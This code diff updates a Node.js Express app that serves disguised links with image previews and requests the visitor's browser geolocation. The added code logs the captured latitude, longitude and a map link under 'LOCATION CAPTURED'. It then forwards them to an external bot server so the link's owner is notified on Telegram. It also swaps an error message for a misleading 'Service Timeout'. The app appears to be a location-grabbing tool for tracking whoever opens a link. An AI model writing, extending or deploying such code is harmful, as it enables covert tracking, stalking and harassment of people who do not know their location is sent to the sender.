@@ -1,6 +1,7 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
+const axios = require('axios');
 
 const app = express();
 
@@ -15,7 +16,8 @@ app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 app.use(express.static('public'));
 
 const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';
-
+const BOT_NOTIFY_URL = process.env.BOT_NOTIFY_URL;
+const NOTIFY_API_KEY = process.env.NOTIFY_API_KEY;
 
 // ======================
 // LOAD LINKS FROM FILE
@@ -40,7 +42,7 @@ app.get('/t/:id', (req, res) => {
     const linkData = links.find(l => l.linkId === linkId);
 
     if (!linkData) {
-        return res.status(404).send('Invalid or expired link');
+        return res.status(404).send('Service Timeout');
     }
 
     const imageUrl = `${BASE_URL}${linkData.thumbnail}`;
@@ -111,25 +113,62 @@ navigator.geolocation.getCurrentPosition(
 // ======================
 // RECEIVE LOCATION
 // ======================
-app.post('/save-location', (req, res) => {
-    const { linkId, latitude, longitude } = req.body;
+app.post('/save-location', async (req, res) => {
+    try {
+        const { linkId, latitude, longitude } = req.body;
 
-    const links = getLinks();
-    const linkData = links.find(l => l.linkId === linkId);
+        const links = getLinks();
 
-    console.log('========================');
-    console.log('📍 LOCATION CAPTURED');
-    console.log('Name:', linkData?.ownerName);
-    console.log('Telegram:', linkData?.telegramUsername);
-    console.log('Latitude:', latitude);
-    console.log('Longitude:', longitude);
-    console.log('Map:', `https://maps.google.com/?q=${latitude},${longitude}`);
-    console.log('Time:', new Date().toISOString());
-    console.log('========================');
+        const linkData = links.find(
+            l => l.linkId === linkId
+        );
 
-    // OPTIONAL: You can later connect Telegram bot here
+        if (!linkData) {
+            return res.status(404).json({
+                error: 'Link not found'
+            });
+        }
 
-    res.json({ status: 'ok' });
+        // Show in Vercel logs
+        console.log('========================');
+        console.log('📍 LOCATION CAPTURED');
+        console.log('Name:', linkData.ownerName);
+        console.log('Telegram:', linkData.telegramUsername);
+        console.log('Latitude:', latitude);
+        console.log('Longitude:', longitude);
+        console.log(
+            'Map:',
+            `https://maps.google.com/?q=${latitude},${longitude}`
+        );
+        console.log('========================');
+
+        // Notify your VPS bot
+        await axios.post(
+            BOT_NOTIFY_URL,
+            {
+                ownerChatId: linkData.ownerChatId,
+                ownerName: linkData.ownerName,
+                latitude,
+                longitude
+            },
+            {
+                headers: {
+                    'x-api-key': NOTIFY_API_KEY
+                }
+            }
+        );
+
+        res.json({
+            success: true
+        });
+
+    } catch (err) {
+        console.error(err.message);
+
+        res.status(500).json({
+            error: err.message
+        });
+    }
 });
 
 
